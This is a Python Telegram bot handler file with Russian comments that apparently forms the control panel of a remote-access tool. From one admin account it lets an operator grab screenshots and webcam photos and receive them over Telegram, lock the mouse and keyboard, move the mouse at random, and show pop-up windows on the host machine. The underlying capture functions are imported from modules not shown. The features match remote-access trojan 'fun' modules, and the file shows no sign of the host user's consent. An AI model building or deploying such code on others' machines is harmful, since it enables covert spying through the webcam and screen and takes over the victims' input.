import os

from aiogram import F, Router, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import FSInputFile
from environs import Env

# Импорты логики
from Funcs import fun_commands, funcs
from Funcs.state import return_message
from Keyboardz.keyboard_fun import keyBoard_funs, keyboard_wybor
# Импортируем модуль сообщений (файл мы переименовали в fun_messages.py)
from message_processing import fun_messages as fs

# 1. Переменные окружения
env = Env()
env.read_env()
ADMIN_ID = env.int('id')

router = Router()

# 2. Состояния


class FunStates(StatesGroup):
    waiting_for_action = State()  # Выбор действия (Скриншот, окно и т.д.)
    waiting_for_input = State()   # Ввод значения (Текст окна, кол-во движений)

# 3. Точка входа (/funfun)


@router.message(Command("funfun"), F.from_user.id == ADMIN_ID)
async def cmd_fun_start(message: types.Message, state: FSMContext):
    await state.set_state(FunStates.waiting_for_action)
    await message.answer(
        "Глава интересное. Выберите действие:",
        reply_markup=keyBoard_funs
    )

# 4. Обработка выбора действия


@router.message(FunStates.waiting_for_action, F.from_user.id == ADMIN_ID)
async def process_fun_action(message: types.Message, state: FSMContext):
    chosen_action = message.text

    # Сохраняем выбор, пригодится если идем во второе состояние
    await state.update_data(choosen=chosen_action)

    # --- МГНОВЕННЫЕ ДЕЙСТВИЯ ---

    if chosen_action == "Скриншот экрана":
        await message.answer("Делаю скриншот...")
        # ИСПРАВЛЕНО: Fun_funcs -> FunFuncs
        fun_commands.FunFuncs.screenshot()

        path = f'{funcs.PATH}ss.png'
        try:
            photo_file = FSInputFile(path)
            await message.answer_photo(photo_file)
            await message.answer(return_message("Скриншот готов\n"), reply_markup=types.ReplyKeyboardRemove())
        except Exception as e:
            await message.answer(f"Ошибка отправки: {e}")
        finally:
            if os.path.exists(path):
                os.remove(path)

        await state.clear()

    elif chosen_action == "Фото с камеры":
        await message.answer("Делаю фото...")
        # ИСПРАВЛЕНО: Fun_funcs -> FunFuncs
        fun_commands.FunFuncs.get_photo_from_camera()

        path = f'{funcs.PATH}cam.png'
        try:
            photo_file = FSInputFile(path)
            await message.answer_photo(photo_file)
            await message.answer(return_message("Фото готово\n"), reply_markup=types.ReplyKeyboardRemove())
        except Exception as e:
            await message.answer(f"Ошибка камеры или отправки: {e}")
        finally:
            if os.path.exists(path):
                os.remove(path)

        await state.clear()

    elif chosen_action == "Блок мышки и клавы":
        # ИСПРАВЛЕНО: Fun_funcs -> FunFuncs
        fun_commands.FunFuncs.block_input(True)
        await message.answer(
            return_message("Заблокировано (Клавиатура и Мышь)\n"),
            reply_markup=types.ReplyKeyboardRemove()
        )
        await state.clear()

    elif chosen_action == "Анблок мышки и клавы":
        # ИСПРАВЛЕНО: Fun_funcs -> FunFuncs
        fun_commands.FunFuncs.block_input(False)
        await message.answer(
            return_message("Разблокировано\n"),
            reply_markup=types.ReplyKeyboardRemove()
        )
        await state.clear()

    # --- ДЕЙСТВИЯ, ТРЕБУЮЩИЕ ВВОДА ---

    elif chosen_action == "Вывод окна":
        await state.set_state(FunStates.waiting_for_input)

        # ИСПРАВЛЕНО: Funs_messages -> FunMessages
        await message.answer(
            fs.FunMessages.fun_segment(chosen_action),
            reply_markup=keyboard_wybor
        )

    elif chosen_action == "Рандом с мышкой":
        await state.set_state(FunStates.waiting_for_input)
        # ИСПРАВЛЕНО: Funs_messages -> FunMessages
        await message.answer(
            fs.FunMessages.fun_segment(chosen_action),
            reply_markup=types.ReplyKeyboardRemove()
        )

    else:
        await state.set_state(FunStates.waiting_for_input)
        # ИСПРАВЛЕНО: Funs_messages -> FunMessages
        await message.answer(
            fs.FunMessages.fun_segment(chosen_action),
            reply_markup=types.ReplyKeyboardRemove()
        )

# 5. Ввод данных


@router.message(FunStates.waiting_for_input, F.from_user.id == ADMIN_ID)
async def process_fun_input(message: types.Message, state: FSMContext):
    input_value = message.text

    data = await state.get_data()
    action = data.get('choosen')

    if action == "Рандом с мышкой":
        try:
            # ИСПРАВЛЕНО: Fun_funcs -> FunFuncs
            fun_commands.FunFuncs.mouse_rand(input_value)
            await message.answer(return_message("Процесс завершен.\n"))
        except Exception as e:
            await message.answer(f"Ошибка выполнения: {e}")

    elif action == "Вывод окна":
        # ИСПРАВЛЕНО: Fun_funcs -> FunFuncs
        fun_commands.FunFuncs.window_warning(input_value)
        await message.answer(return_message("Окно выведено.\n"))

    await message.answer("Готово", reply_markup=types.ReplyKeyboardRemove())
    await state.clear()
